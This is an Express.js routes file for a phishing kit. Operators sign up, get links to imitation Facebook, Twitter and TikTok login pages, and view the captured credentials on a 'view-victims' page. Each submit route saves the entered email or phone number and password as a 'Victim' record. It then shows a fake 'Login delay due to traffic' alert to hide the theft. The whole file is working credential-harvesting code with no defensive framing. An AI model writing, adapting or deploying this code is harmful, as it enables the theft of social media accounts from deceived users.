const express = require('express');
const User = require('../models/User');
const Victim = require('../models/Victim');
const router = express.Router();

// Root route: Redirects to the registration page
router.get('/', (req, res) => {
    res.redirect('/register');
});

// Render registration page
router.get('/register', (req, res) => {
    res.render('register');
});

// Handle registration form submission
router.post('/register', async (req, res) => {
    const { username, email, password } = req.body;
    try {
        const user = new User({ username, email, password });
        await user.save();
        res.redirect('/login');
    } catch (err) {
        console.error('Error creating user:', err);
        res.status(400).send('Error creating user');
    }
});

// Render login page
router.get('/login', (req, res) => {
    res.render('login');
});

// Handle login form submission
router.post('/login', async (req, res) => {
    const { email, password } = req.body;
    console.log("Attempting login with email:", email);
    try {
        const user = await User.findOne({ email });
        if (!user) {
            console.log('User not found in database:', email);
            return res.status(401).send('Invalid email or password');
        }
        const isMatch = await user.comparePassword(password);
        if (isMatch) {
            req.session.userId = user._id;
            return res.redirect('/dashboard');
        } else {
            console.log('Password mismatch for user:', email);
            return res.status(401).send('Invalid email or password');
        }
    } catch (err) {
        console.error('Error during login:', err);
        res.status(500).send('Internal server error');
    }
});

// Render dashboard page if user is logged in
router.get('/dashboard', async (req, res) => {
    if (!req.session.userId) {
        return res.redirect('/login');
    }
    try {
        const user = await User.findById(req.session.userId);
        res.render('dashboard', { user, userId: req.session.userId });
    } catch (err) {
        console.error('Error loading dashboard:', err);
        res.status(500).send('Error loading dashboard');
    }
});






// Facebook page route
router.get('/facebook', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('facebook', { userId });
});

router.post('/submit-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Facebook' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Facebook victim details:', err);
        res.status(500).send('Error processing request');
    }
});

// View victims page with data specific to logged-in user
router.get('/view-victims', async (req, res) => {
    const userId = req.session.userId; // Retrieve logged-in user's ID from session

    if (!userId) {
        return res.status(401).send("Unauthorized");
    }

    try {
        const victims = await Victim.find({ userId }); // Fetch victims for the specific user
        res.render('view-victims', { victims });
    } catch (err) {
        console.error('Error loading victims:', err);
        res.status(500).send('Error loading victims');
    }
});

// Delete victim entry by ID
router.post('/delete-victim/:id', async (req, res) => {
    const victimId = req.params.id;

    try {
        await Victim.findByIdAndDelete(victimId);
        res.redirect('/view-victims');
    } catch (error) {
        console.error(error);
        res.status(500).send('Error deleting data');
    }
});



// Twitter page route
router.get('/twitter', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('twitter', { userId });
});

//Route to Handle Twitter Form Submission
router.post('/submit-twitter-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Twitter' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Twitter victim details:', err);
        res.status(500).send('Error processing request');
    }
});




// TikTok route
router.get('/tiktok', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('tiktok', { userId });
});

// Route to handle TikTok form submission
router.post('/submit-tiktok-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'TikTok' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving TikTok victim details:', err);
        res.status(500).send('Error processing request');
    }
});




module.exports = router;
